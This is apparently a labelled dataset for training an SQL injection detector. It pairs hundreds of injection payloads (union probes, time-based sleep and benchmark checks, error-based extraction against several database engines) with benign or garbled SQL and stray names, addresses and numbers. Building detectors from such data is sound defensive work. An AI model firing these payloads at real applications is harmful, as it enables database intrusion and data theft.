payload	label
-4173'  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  'jdwt' like 'jdwt	1
   SELECT Employees.answer, COUNT ( Orders.soilID )  AS chooseFROM    ( OrdersINNER JOIN neighborhood ON Orders.occurID  =  Employees.pondID ) 	0
1%'   )    )    union all select null,null,null,null,null,null,null,null,null,null#	1
select * from generate_series  (  9709,9709,case when   (  9709  =  7795  )   then 1 else 0 end  )   limit 1--	1
SELECT great ( s )  FROM slow FULL OUTER JOIN	0
SELECT tales ( s )  FROM important	0
SELECT heart	0
1'  )   as sjzi where 8242  =  8242 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --	1
1%' or elt  (  6272  =  6272,sleep  (  5   )    )    and '%'  =  '	1
"1%""   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   ""%""  =  """	1
  SELECT PERIOD_ADD ( 201703, -2 ) ;	0
1'+  (  select somn where 8636  =  8636 rlike sleep  (  5   )    )   +'	1
"1%""  )   and 8626  =  3626#"	1
conciliador	0
 select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1	1
1'||  (  select 'lzzr' where 2477  =  2477	1
1281450000000000	0
  UPDATE would SET zoo =  'family', City =  'death' WHERE magnet =  throat	0
SELECT * FROM forgotten  WHERE needs NOT LIKE '[creature]%'	0
1 waitfor delay '0:0:5'-- nnnp	1
1   )    )     )   union all select null,null,null,null,null#	1
SELECT * FROM  ( SELECT what FROM complex ) 	0
macedonia 48	0
1'  )   as njfg where 6392  =  6392 waitfor delay '0:0:5'--	1
"1""   )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (     (  ""opdl""  =  ""opdl"	1
58193627q	0
-1305  )   or make_set  (  2298  =  5545,5545  )   and   (  6715  =  6715	1
SELECT COUNT ( DISTINCT flight )  FROM neighbor	0
SELECT brave FROM tongue UNION ALL SELECT ought FROM business ORDER BY specific	0
1%'   )    )     )   union all select null,null,null,null,null,null,null,null#	1
  )   or   (  'x'  )    =    (  'x	1
1'  )   as ulbr where 7233  =  7233 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --	1
enconadura	0
"1""  )   where 2873  =  2873 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --"	1
SELECT farther ( s FROM refer RIGHT JOIN	0
1800000000000000	0
  UPDATE football SET offer =  'tomorrow', City =  'due' WHERE after =  exchange	0
SELECT * FROM  ( SELECT stock FROM driven ) 	0
-1922%'  )   union all select 2335,2335,2335,2335,2335,2335,2335,2335,2335,2335--	1
-5062  )   where 7457  =  7457 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --	1
SELECT * FROM still WHERE    NOT particular = 'sometime'	0
select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and 'fvda' like 'fvda	1
lasedad	0
1' in boolean mode  )   and 4457  =  3885#	1
"-5161%"" or   (  1437  =  4869  )  *4869 and ""%""  =  """	1
"-6359""   )    )    or elt  (  3546  =  2433,2433  )   and    (    (   ""qxat""  =  ""qxat"	1
SELECT * FROM arrive WHERE NOT suppose = 'yourself'  AND NOT fine = 'up'	0
"-8491"" where 9043  =  9043 union all select 9043,9043,9043,9043,9043,9043,9043,9043,9043--"	1
raddalgo	0
SELECT * FROM salt WHERE flower = 'occasionally'  OR same = 'crack'	0
"1%""  )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --"	1
3154020000000000	0
argem grive	0
5867	0
retallac	0
SELECT * FROM joined	0
SELECT silence FROM caught UNION SELECT upward FROM except ORDER BY one	0
"-4745"" or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""nifq"" like ""nifq"	1
SELECT Count ( * )  AS father	0
igzquiza	0
depredador	0
   SELECT Employees.solution, COUNT ( Orders.braveID )  AS fromFROM    ( OrdersINNER JOIN limited ON Orders.hisID  =  Employees.boundID ) 	0
SELECT our ( s )  FROM cut	0
SELECT * FROM help FETCH FIRST 50 PERCENT ROWS ONLY	0
descostill3r	0
SELECT TOP 3 * FROM believed	0
SELECT * FROM wp_favethemes_currency_converter	0
"1%""   )    )     )   union all select null,null--"	1
1'||  (  select 'kgfu' from dual where 2607  =  2607 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --	1
equilibrio	0
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   ""uidb"" like ""uidb"	1
-3422%'  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  '%'  =  '	1
SELECT below ( s FROM getting RIGHT JOIN	0
1'  )   and 7533  =  7533 and   (  'xyga' like 'xyga	1
talavera	0
SELECT * FROM serious WHERE sound = 'pair' LIMIT 3	0
-5288'  )   or make_set  (  1164  =  1710,1710  )   and   (  'pkwy'  =  'pkwy	1
1'  )   where 4500  =  4500	1
"-1413""  )   union all select 6651,6651,6651--"	1
  SELECT closelyID AS ID, base AS depend FROM experiment	0
-6202   )    )    or 7845  =  1962--	1
99783130e	0
SELECT bottle ( s )  FROM needs SELECT too ( s ) 	0
 select * from users where id  =  '1' +   (  \  )   union select 1,@@VERSION -- 1'	1
"-8410"" or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""xhzr""  =  ""xhzr"	1
SELECT * FROM melted WHERE Price NOT BETWEEN 10 AND 20	0
select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3#	1
"1%""   )    )     )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --"	1
1503380000000000	0
SELECT option_value FROM wp_options WHERE option_name  =  '_houzez_property_type_3146' LIMIT 1	0
-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--	1
15107	0
1  )   as drgs where 1989  =  1989 order by 1--	1
narros de matalayegua	0
SELECT * FROM talk WHERE sugar BETWEEN '1996-07-01' AND '1996-07-31'	0
1%' and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and '%'  =  '	1
1' in boolean mode  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   #	1
1269520000000000	0
SELECT * FROM difficult  WHERE question = torn	0
SELECT COUNT ( carried ) FROM wheat	0
select case when 8227  =  1229 then 1 else null end--	1
33273113w	0
1' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'nhmz' like 'nhmz	1
SELECT * FROM born 3 SELECT * FROM us	0
1'   )    )     (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (   'rbhe'  =  'rbhe	1
"-5827""  )   as lskq where 7683  =  7683 union all select 7683,7683,7683,7683,7683#"	1
SELECT MIN ( size )  AS write FROM met	0
"1""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""jzbb""  =  ""jzbb"	1
SELECT * FROM vertical WHERE ready = 'paid' FETCH FIRST 3 ROWS ONLY	0
42156	0
"1""  )   where 6679  =  6679 rlike sleep  (  5  )  #"	1
SELECT * FROM whole ORDER BY night DESC	0
"1%""   )    )    and elt  (  4249  =  4249,7259  )   and    (    (   ""%""  =  """	1
carmelo	0
  SELECT Orders.quicklyrID, Employees.about, Employees.deal FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.stoppedID ORDER BY Orders.divideID	0
aventajada	0
SELECT AVG ( inch ) FROM wood SELECT SUM ( silly ) 	0
SELECT get ( s )  FROM smoke UNION	0
1'+  (  select 'wkbg' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'	1
  SELECT eatID AS ID, all AS hot FROM earlier	0
   SELECT promised, additional, learn FROM value WHERE order  IS NULL	0
duthie	0
1  )   as ocut where 6800  =  6800 and elt  (  4249  =  4249,7259  )  --	1
SELECT bridge ( s )  FROM able SELECT thing ( s ) 	0
1  )   union all select null,null,null,null,null,null,null,null#	1
SELECT * FROM buffalo WHERE copy IN  ( SELECT maybe FROM division ) 	0
godayol iafrate	0
1'   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  'gegg'  =  'gegg	1
calle puruuela, 15 6?d	0
1'+  (  select inyd where 1668  =  1668 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  +'	1
1   )    )    as eigk where 2557  =  2557	1
59760678p	0
"1""  )   as upjw where 3880  =  3880 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --"	1
1'+  (  select 'qrml' where 3791  =  3791 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  +'	1
delujan	0
SELECT * FROM salmon  WHERE principal NOT LIKE '[his]%'	0
"1%"" union all select null,null,null,null,null,null,null,null,null,null--"	1
SELECT * FROM coach WHERE rose = 'wooden'	0
1'   )    )     )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  'dhqz'  =  'dhqz	1
1'+  (  select 'wvqj' where 3709  =  3709	1
SELECT * FROM capital WHERE kill = 'oxygen'  OR airplane = 'known'	0
select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4#	1
1'  )   where 8948  =  8948 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --	1
1   )    )    as bebl where 2597  =  2597   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --	1
INSERT INTO capital ( factory, this, shake, sides, under, cut )  VALUES  ( 'variety', 'bear'. spoken', 'slight', 'nails', 'mission', 'lying' )  	0
SELECT material ( s )  FROM port SELECT automobile FROM almost	0
triantap	0
SELECT * FROM tin WHERE before BETWEEN general09/01/1996poor AND practice15/31/1996that	0
"-6667%""   )    )    union all select 7348,7348,7348,7348,7348,7348,7348,7348#"	1
"1""  )   where 8407  =  8407 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --"	1
SELECT * FROM join	0
domingo	0
chen-che	0
"-2122""  )   as zytb where 7025  =  7025 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --"	1
cherwin4@xavipetit.mu	0
SELECT * FROM spend WHERE because BETWEEN 'union' AND 'remember'	0
SELECT * FROM spider ORDER BY driver	0
-8357'   )    )    as henk where 8198  =  8198 or 2558  =  9103#	1
SELECT MIN ( large )  AS hardly FROM century	0
declare @q nvarchar   (  4000  )   select @q   = 	1
   SELECT suddenly, tropical, voyageFROM door WHERE tales  IS NOT NULL	0
anamary	0
"-6084""   )    )    union all select 7354,7354,7354,7354,7354,7354,7354,7354#"	1
  SELECT except,he,extra FROM child LEFT JOIN Orders ON market.classID =  palace.dead ORDER BY course.leader	0
robledo	0
maestro de burgos, 199	0
 SELECT * FROM rays ORDER BY parallel, milk	0
SELECT * FROM stepped WHERE broken BETWEEN '1996-07-01' AND '1996-07-31'	0
clunes7@palodegolf.com.coop	0
SELECT * FROM movement WHERE stuck = 'combination'  AND  ( change = 'apartment' OR widely = 'egg' ) 	0
SELECT COUNT ( grabbed ) FROM origin	0
"1%""  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""%""  =  """	1
1%' rlike sleep  (  5  )   and '%'  =  '	1
   SELECT automobile,balance,younger,substance,blank     (  (  material JOIN leader ON president.clock =  strike.captured )   INNER JOIN olderON Orders.horn =  meal.graphID ) 	0
1075440000000000	0
bancalero	0
"-4993"" union all select 6959,6959,6959--"	1
ballonga	0
SELECT COUNT ( six )  FROM here	0
ci2586ta	0
2.02612E+015	0
select * from users where id  =  '1' <@$_ or 1  =  1 -- 1'	1
SELECT too FROM particularly UNION ALL SELECT bit FROM plan ORDER BY nature	0
01632755p	0
gonzalvo gorriti	0
gayle@freetag.name	0
1'  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  'ajkb'  =  'ajkb	1
SELECT * FROM box WHERE start = 'clock'	0
benalup-casas viejas	0
SELECT * FROM lift WHERE beginning = 'mission'  AND City = 'dig'	0
1%'  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  '%'  =  '	1
DELETE FROM pet WHERE own = 'made'	0
c/ bailen 8,	0
SELECT supply	0
SELECT * FROM nearer WHERE sitting = 'upward'  AND  ( tree = 'list' OR rope = 'body' ) 	0
-8654' union all select 7190,7190,7190,7190,7190#	1
SELECT * FROM lower FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM fear	0
SELECT AVG ( noon ) FROM finger	0
   SELECT visit, extra, principleFROM lesson WHERE better  IS NOT NULL	0
1' where 1836  =  1836 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --	1
SELECT * FROM sudden ORDER BY useful	0
houstin@maxitienda.zr	0
c/ francisco de ricci 23, 1?c	0
SELECT job ( s )  FROM solar UNION ALL	0
SELECT * FROM most ORDER BY people	0
select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf	1
"1"" where 5334  =  5334 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --"	1
1' or sleep  (  5  ) 	1
4560	0
2925	0
SELECT * FROM made WHERE group = 'crop' FETCH FIRST 3 ROWS ONLY	0
-4222'  )   union all select 9267,9267,9267,9267,9267,9267--	1
-8758' union all select 6885,6885,6885,6885,6885,6885,6885,6885--	1
SELECT spend ( s ) FROM short INNER JOIN	0
"-4407""  )   where 2055  =  2055 or elt  (  9714  =  5040,5040  )  --"	1
  SELECT Orders.instantrID, Employees.captain, Employees.though FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.dotID ORDER BY Orders.anyID	0
SELECT LOG ( 2, 4 ) ;	0
"1""   )    )    and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --"	1
lawlik@housemovie.lk	0
   SELECT should, composed+ ', ' + military+ ' ' + cat+ ', ' + teach AS facing  FROM stopped	0
SELECT COUNT ( DISTINCT breathe )  FROM turn	0
empeine	0
1'   )    )    and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   'mymg'  =  'mymg	1
chuvalo@ppmanzanares.nc	0
SELECT term_id, meta_key, meta_value FROM wp_termmeta WHERE term_id IN  ( 2691,2767,2874 )  ORDER BY meta_id ASC	0
1' in boolean mode  )   and elt  (  9630  =  4765,4765  )  #	1
INSERT INTO town  ( off, principal, back )  VALUES  ( 'chose', 'missing', 'transportation' )  	0
SELECT * FROM movie WHERE physical = 'man'  AND City = 'leather'	0
ar2e5tad6	0
blenkarn6	0
SELECT option_value FROM wp_options WHERE option_name  =  'classic-editor-allow-users' LIMIT 1	0
iif  (  1878  =  2513,1,1/0  )  	1
1' in boolean mode  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  #	1
dipscea	0
 SELECT 'Customer' AS Type, ContactName, City, Country FROM Customers UNION 	0
SELECT * FROM  ( SELECT girl FROM improve ) 	0
SELECT * FROM storm ORDER BY fifty	0
SELECT * FROM sure WHERE Price NOT BETWEEN 10 AND 20	0
"-7409""   )    )    union all select 3145,3145,3145--"	1
"1%""   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --"	1
olivar, 174,	0
sevilla	0
couri-manahan@copiar.com.fm	0
1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#	1
6164300000000000	0
6866	0
SELECT * FROM wp_posts WHERE ID  =  262331 LIMIT 1	0
14100	0
   SELECT box, behavior, sit FROM lost WHERE stock  IS NULL	0
SELECT * FROM repeat WHERE observe BETWEEN 'exact' AND 'boat'	0
1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'zoin'  =  'zoin	1
"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """	1
call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )  #	1
1'+  (  select blbd where 7451  =  7451 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'	1
-2036'  )   or   (  8459  =  8459  )  *4906 and   (  'hjeu'  =  'hjeu	1
 select * from users where id  =  1 -@<@ union select version  (    )  ,version  (    )   -- 1	1
   SELECT softly, sets, helpFROM stepped WHERE jack  IS NOT NULL	0
quinita flores 75,	0
moneyba, 114	0
SELECT nation ( s ) FROM spend INNER JOIN	0
  UPDATE bean SET well =  'replied', City =  'gain' WHERE mathematics =  twice	0
iif  (  9007  =  3836,1,1/0  )  	1
-8580'  )   union all select 3428,3428,3428,3428,3428,3428,3428,3428,3428#	1
SELECT map FROM will UNION ALL SELECT accurate FROM wrapped ORDER BY grew	0
SELECT * FROM area	0
   SELECT fought, previous, occasionally FROM without WHERE meant  IS NULL	0
SELECT * FROM morning FETCH FIRST 3 ROWS ONLY	0
SELECT political FROM kitchen UNION ALL SELECT fighting FROM ancient ORDER BY center	0
SELECT MIN ( compound )  AS underline FROM crowd	0
SELECT * FROM space WHERE adult LIKE '%situation%'	0
1992810000000000	0
"1"" where 2403  =  2403 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --"	1
SELECT hand ( s )  FROM mine LEFT JOIN	0
"1""  )   where 8612  =  8612"	1
  SELECT Orders.roserID, Employees.bad, Employees.hot FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.troubleID ORDER BY Orders.necessaryID	0
shih_brusse@professionalhost.jp	0
SELECT AVG ( met )  FROM cap  SELECT SUM ( final ) 	0
SELECT * FROM pull FETCH FIRST 50 PERCENT ROWS ONLY	0
1 where 6369  =  6369 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --	1
select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  'qfsu'  =  'qfsu	1
  UPDATE shade SET scene =  'failed', City =  'herself' WHERE fastened =  fear	0
1'+  (  select 'qzcx' where 9524  =  9524 and elt  (  3069  =  8430,8430   )    )   +'	1
almirall pahisa	0
"  SELECT MICROSECOND ( ""2017-06-20 09:34:00.000023"" ) ;"	0
1'   )    )    as tgso where 1349  =  1349 union all select null,null,null,null--	1
   SELECT Employees.column, COUNT ( Orders.stickID )  AS seeFROM    ( OrdersINNER JOIN leader ON Orders.winID  =  Employees.silenceID ) 	0
moloney@imarbella.travel	0
SELECT indicate FROM western UNION SELECT shelf FROM accurate ORDER BY warm	0
rapetto picabea	0
1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  'osov' like 'osov	1
  SELECT Orders.gamerID, Employees.offer, Employees.fast FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.tookID ORDER BY Orders.definitionID	0
1'+  (  select 'utlx' where 6256  =  6256 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  +'	1
medel pujolriu	0
1   )    )    order by 1#	1
FROM  ( SELECT DISTINCT dried FROM muscle ) 	0
SELECT DISTINCT effort FROM spell	0
SELECT * FROM just WHERE Price NOT BETWEEN 10 AND 20	0
"1"" where 7599  =  7599"	1
"1""  )   where 8462  =  8462 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --"	1
4.22608E+015	0
1'||  (  select 'cqjw' from dual where 7335  =  7335 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   ||'	1
SELECT AVG ( skill ) FROM tower SELECT SUM ( great ) 	0
select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (     (  7946  =  7946	1
22440	0
boget brufau	0
call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )  	1
roze	0
93698052p	0
1 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   -- yczq	1
92106863m	0
SELECT * FROM torn WHERE feathers = 'count'  OR today = 'rule'	0
SELECT * FROM mass WHERE rubbed  BETWEEN 10 AND 20	0
2557910000000000	0
1 where 8135  =  8135	1
1  )   where 1203  =  1203 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #	1
c/ pontevedra 25, 6a	0
INSERT INTO pole  ( earn, eat, corner )  VALUES  ( 'harder', 'sun', 'plus' )  	0
salv sagra	0
chaddie	0
1'   )    )    as wqhm where 9871  =  9871	1
  SELECT * FROM invented WHERE along NOT IN  ( 'another', 'level', 'remarkable' )  	0
1%' or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --	1
1'  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'wdeu' like 'wdeu	1
1'  )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  'maln' like 'maln	1
avril	0
15911	0
1%'   )    )    or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   '%'  =  '	1
1' where 9816  =  9816 and 7533  =  7533--	1
-3756'  )   union all select 1034,1034,1034--	1
-7812'  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'ttvo'  =  'ttvo	1
SELECT * FROM  ( SELECT rain FROM lion ) 	0
-6370'   )    )    as sims where 9388  =  9388 union all select 9388,9388,9388,9388,9388,9388,9388,9388#	1
 SELECT * FROM aside ORDER BY swam, ball	0
calle barrio carmelo 21,	0
SELECT lion ( s )  FROM scale SELECT figure ( s ) 	0
21	0
SELECT COUNT ( DISTINCT lead )  FROM state	0
SELECT * FROM excitement 3 SELECT * FROM level	0
1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'iwkg'  =  'iwkg	1
SELECT golden ( s )  FROM citizen UNION	0
-3852'  )   union all select 3577,3577,3577,3577,3577,3577,3577,3577#	1
gaylor	0
 SELECT * FROM state ORDER BY basis ASC, trouble DESC	0
3869320000000000	0
SELECT Count ( * )  AS greatly	0
5150	0
SELECT * FROM eleven WHERE own = 'air'  AND  ( series = 'wheat' OR interior = 'bowl' ) 	0
chunshin	0
1' where 7104  =  7104 union all select null,null,null,null,null,null,null#	1
